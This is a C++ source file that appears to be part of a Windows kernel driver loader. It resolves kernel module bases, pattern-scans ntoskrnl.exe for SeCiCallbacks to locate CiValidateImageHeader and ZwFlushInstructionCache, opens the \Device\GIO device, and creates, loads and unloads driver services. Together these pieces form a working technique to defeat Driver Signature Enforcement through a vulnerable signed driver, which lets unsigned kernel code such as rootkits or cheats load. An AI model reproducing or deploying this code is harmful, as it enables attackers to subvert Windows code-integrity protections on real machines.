#include "includes.h"
#include "win_api_defs.h"


NTSTATUS modules::FindKernelModule( PCCH ModuleName, PULONG_PTR ModuleBase )
{
    *ModuleBase = { 0 };

    ULONG size{ 0 };
    NTSTATUS stat;

    if ( ( stat = NtQuerySystemInformation( ( SYSTEM_INFORMATION_CLASS )11, nullptr, 0, &size ) ) != STATUS_INFO_LENGTH_MISMATCH ) return 0;

    const PRTL_PROCESS_MODULES Modules = static_cast< PRTL_PROCESS_MODULES >( RtlAllocateHeap( helpers::GetProcessHeapFromPEB(), HEAP_ZERO_MEMORY, 2 * static_cast< SIZE_T >( size ) ) );

    stat = NtQuerySystemInformation( ( SYSTEM_INFORMATION_CLASS )11, Modules, 2 * size, nullptr );

    if ( !NT_SUCCESS( stat ) ) goto Exit;

    for ( ULONG i = 0; i < Modules->NumberOfModules; ++i )
    {
        RTL_PROCESS_MODULE_INFORMATION Module = Modules->Modules[i];
        if ( _stricmp( ModuleName, reinterpret_cast< PCHAR >( Module.FullPathName ) + Module.OffsetToFileName ) == 0 )
        {
            *ModuleBase = reinterpret_cast< ULONG_PTR >( Module.ImageBase );
            stat = STATUS_SUCCESS;
            break;
        }
    }

Exit:
    RtlFreeHeap( helpers::GetProcessHeapFromPEB(), 0, Modules );
    return stat;
}

ULONG_PTR modules::GetKernelModuleAddress( const char* name ) {

    DWORD size = 0;
    void* buffer = NULL;
    PRTL_PROCESS_MODULES modules;

    NTSTATUS status = NtQuerySystemInformation( ( SYSTEM_INFORMATION_CLASS )11, buffer, size, &size );

    while ( status == STATUS_INFO_LENGTH_MISMATCH ) {
        VirtualFree( buffer, 0, MEM_RELEASE );

        buffer = VirtualAlloc( NULL, size, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE );
        status = NtQuerySystemInformation( ( SYSTEM_INFORMATION_CLASS )11, buffer, size, &size );
    }

    if ( !NT_SUCCESS( status ) )
    {
        VirtualFree( buffer, 0, MEM_RELEASE );
        return NULL;
    }

    modules = ( PRTL_PROCESS_MODULES )buffer;

    for ( int i = 0; i < modules->NumberOfModules; i++ )
    {
        char* currentName = ( char* )modules->Modules[i].FullPathName + modules->Modules[i].OffsetToFileName;

        if ( !_stricmp( currentName, name ) ) {
            ULONG_PTR result = ( ULONG_PTR )modules->Modules[i].ImageBase;
            VirtualFree( buffer, 0, MEM_RELEASE );
            return result;
        }
    }

    VirtualFree( buffer, 0, MEM_RELEASE );
    return NULL;
}

seCiCallbacks_swap modules::get_CIValidate_ImageHeaderEntry() {

    std::wcout << ( "[*] Searching Pattern...\n" );

    ULONG_PTR mod_base = modules::GetKernelModuleAddress( "ntoskrnl.exe" );

    HMODULE usermode_load_va = LoadLibraryEx( L"ntoskrnl.exe", NULL, DONT_RESOLVE_DLL_REFERENCES );
    DWORD64 uNtAddr = ( DWORD64 )usermode_load_va;
    void* ntoskrnl_ptr = ( void* )usermode_load_va;

    //Calculating the size of the loaded module
    MODULEINFO modinfo;
    GetModuleInformation( GetCurrentProcess(), usermode_load_va, &modinfo, sizeof( modinfo ) );
    
    unsigned char pattern[] = { 0xff, 0x48, 0x8b, 0xd3, 0x4c, 0x8d, 0x05 };

    DWORD64 seCiCallbacksInstr = helpers::FindInstructionWithPattern( uNtAddr, modinfo.SizeOfImage, pattern, sizeof( pattern ), 4 );
   
    INT32 seCiCallbacksLeaOffset = *( INT32* )( seCiCallbacksInstr + 3 );

    DWORD64 nextInstructionAddr = seCiCallbacksInstr + 3 + 4;

    DWORD64 seCiCallbacksAddr = nextInstructionAddr + seCiCallbacksLeaOffset;

    wprintf( L"[*] Usermode CiCallbacks: 0x%016llX\n", seCiCallbacksAddr );

    DWORD64 KernelOffset = seCiCallbacksAddr - uNtAddr;
    wprintf( L"[*] Offset: 0x%016llX\n", KernelOffset );

    DWORD64 kernelAddress = mod_base + KernelOffset;

    DWORD64 zwFlushInstructionCache = ( DWORD64 )helpers::GetProcAddress( usermode_load_va, L"ZwFlushInstructionCache" ) - uNtAddr + mod_base;

    DWORD64 ciValidateImageHeaderEntry = kernelAddress + 0x20; // Kernel Base + 0x20 = ImageHeaderEntry mov r8

    return seCiCallbacks_swap{ ciValidateImageHeaderEntry, zwFlushInstructionCache };
}

NTSTATUS modules::OpenDeviceHandle( _Out_ PHANDLE DeviceHandle, _In_ BOOLEAN PrintErrors )
{
    UNICODE_STRING devName = RTL_CONSTANT_STRING( L"\\Device\\GIO" );
    OBJECT_ATTRIBUTES ObjectAttributes = RTL_CONSTANT_OBJECT_ATTRIBUTES( &devName, OBJ_CASE_INSENSITIVE );
    IO_STATUS_BLOCK IoStatusBlock{};

    static const NTSTATUS stat = NtCreateFile( DeviceHandle, SYNCHRONIZE, &ObjectAttributes, &IoStatusBlock, nullptr, 
        FILE_ATTRIBUTE_NORMAL, FILE_SHARE_READ | FILE_SHARE_WRITE | FILE_SHARE_DELETE, FILE_OPEN, FILE_SYNCHRONOUS_IO_NONALERT | FILE_NON_DIRECTORY_FILE, nullptr, 0 );

    if ( !NT_SUCCESS( stat ) && PrintErrors ) return stat;

    return stat;
}


NTSTATUS modules::CreateDriverService( PWCHAR ServiceName, PWCHAR FileName )
{
    helpers::FileNameToServiceName( ServiceName, FileName );
    NTSTATUS Status = RtlCreateRegistryKey( RTL_REGISTRY_ABSOLUTE, ServiceName );
    
    if ( !NT_SUCCESS( Status ) )    return Status;

    WCHAR NtPath[MAX_PATH];
    ULONG ServiceType = SERVICE_KERNEL_DRIVER;

    Status = RtlWriteRegistryValue( RTL_REGISTRY_ABSOLUTE, ServiceName, L"ImagePath", REG_SZ, NtPath, helpers::ConvertToNtPath( NtPath, FileName ) );
    
    if ( !NT_SUCCESS( Status ) )    return Status;

    Status = RtlWriteRegistryValue( RTL_REGISTRY_ABSOLUTE, ServiceName, L"Type", REG_DWORD, &ServiceType, sizeof( ServiceType ) );

    std::wprintf( L"[*] Service Created for %ws\n", FileName );
    return Status;
}

int helpers::ConvertToNtPath( PWCHAR Dst, PWCHAR Src ) {
    if ( !Dst || !Src ) return 0;

    constexpr const wchar_t* NtPrefix = { L"\\??\\" };
    constexpr size_t PrefixLen = 4;
    
    size_t srcLen = wcslen( Src );
    size_t totalLen = PrefixLen + srcLen;

    if ( totalLen >= MAX_PATH ) return 0; 

    // fk it - manual copying
    Dst[0] = L'\\';
    Dst[1] = L'?';
    Dst[2] = L'?';
    Dst[3] = L'\\';

    for ( size_t i = 0; i <= srcLen; ++i ) Dst[PrefixLen + i] = Src[i];
    
    return static_cast< int >( ( totalLen + 1 ) * sizeof( wchar_t ) ); 
}





NTSTATUS modules::LoadDriver( PWCHAR ServiceName )
{
    UNICODE_STRING ServiceNameUcs;
    RtlInitUnicodeString( &ServiceNameUcs, ServiceName );
    return NtLoadDriver( &ServiceNameUcs );
}

NTSTATUS modules::UnloadDriver( PWCHAR ServiceName )
{
    UNICODE_STRING ServiceNameUcs;
    RtlInitUnicodeString( &ServiceNameUcs, ServiceName );
    return NtUnloadDriver( &ServiceNameUcs );
}